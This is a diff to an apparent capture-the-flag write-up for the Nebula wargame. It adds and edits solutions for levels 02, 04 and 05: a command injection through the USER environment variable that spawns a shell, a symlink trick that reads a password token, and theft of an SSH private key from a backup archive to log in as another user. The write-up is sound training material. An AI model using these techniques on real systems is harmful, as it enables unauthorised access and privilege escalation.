@@ -92,7 +92,7 @@ level02@nebula:/home/flag02$ ./flag02
 about to call system("/bin/echo level02 is cool")
 level02 is cool
 ```
-Initial attempt at changing the USER variable:
+Initial attempts at changing the USER variable:
 ```
 level02@nebula:/home/flag02$ USER=/bin/sh ./flag02
 about to call system("/bin/echo /bin/sh is cool")
@@ -101,7 +101,7 @@ level02@nebula:/home/flag02$ USER=/bin/sh; ./flag02
 about to call system("/bin/echo /bin/sh is cool")
 /bin/sh is cool
 ```
-Success!
+Adding a '#' turns 'is cool' into a comment and allows `/bin/sh` to be run. 
 ```
 level02@nebula:/home/flag02$ USER=';/bin/sh #' ./flag02
 about to call system("/bin/echo ;/bin/sh # is cool")
@@ -167,10 +167,10 @@ level04@nebula:~$ ln -s /home/flag04/token ttttt
 level04@nebula:~$ /home/flag04/flag04 ttttt 
 [REDACTED]
 ```
-This gives a password that we can use to log in as the flag04 user.
+This gives a password that we can use to log in as the flag04 user via ssh.
 
 ```
-ssh flag04@IPADDRESS
+$ ssh flag04@IPADDRESS
 [ENTER THE PASSWORD]
 ```
 Now run the get flag command.
@@ -181,3 +181,85 @@ You have successfully executed getflag on a target account
 ### Level 05
 
 [Level 05 Description](https://exploit.education/nebula/level-05/)  
+
+```
+level05@nebula:~$ ls -al
+total 5
+drwxr-x--- 1 level05 level05   60 2021-03-28 01:57 .
+drwxr-xr-x 1 root    root     160 2012-08-27 07:18 ..
+-rw-r--r-- 1 level05 level05  220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 level05 level05 3353 2011-05-18 02:54 .bashrc
+drwx------ 2 level05 level05   60 2021-03-28 01:57 .cache
+-rw-r--r-- 1 level05 level05  675 2011-05-18 02:54 .profile
+drwx------ 2 level05 level05    3 2012-08-27 07:15 .ssh
+level05@nebula:~$ ls -al /home/flag05
+total 5
+drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
+drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ..
+drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
+-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
+-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
+drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
+```
+Look in the backup directory
+Look in the tar file.
+
+```
+level05@nebula:~$ tar -xvf /home/flag05/.backup/backup-19072011.tgz 
+.ssh/
+.ssh/id_rsa.pub
+.ssh/id_rsa
+.ssh/authorized_keys
+level05@nebula:~$ ls -al
+total 5
+drwxr-x--- 1 level05 level05   80 2021-03-28 01:57 .
+drwxr-xr-x 1 root    root     160 2012-08-27 07:18 ..
+-rw-r--r-- 1 level05 level05  220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 level05 level05 3353 2011-05-18 02:54 .bashrc
+drwx------ 2 level05 level05   60 2021-03-28 01:57 .cache
+-rw-r--r-- 1 level05 level05  675 2011-05-18 02:54 .profile
+drwxr-xr-x 1 level05 level05  100 2011-07-19 02:37 .ssh
+```
+Copy private key to attack machine, rename as level05_key.
+
+```
+$ chmod 600 level05_key 
+$ ssh -i level05_key flag05@IP_ADDRESS
+  
+      _   __     __          __     
+     / | / /__  / /_  __  __/ /___ _
+    /  |/ / _ \/ __ \/ / / / / __ `/
+   / /|  /  __/ /_/ / /_/ / / /_/ / 
+  /_/ |_/\___/_.___/\__,_/_/\__,_/  
+                                    
+    exploit-exercises.com/nebula
+
+
+For level descriptions, please see the above URL.
+
+To log in, use the username of "levelXX" and password "levelXX", where
+XX is the level number.
+
+Currently there are 20 levels (00 - 19).
+
+
+Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+New release '12.04 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+flag05@nebula:~$ 
+
+flag05@nebula:~$ getflag
+You have successfully executed getflag on a target account
+```
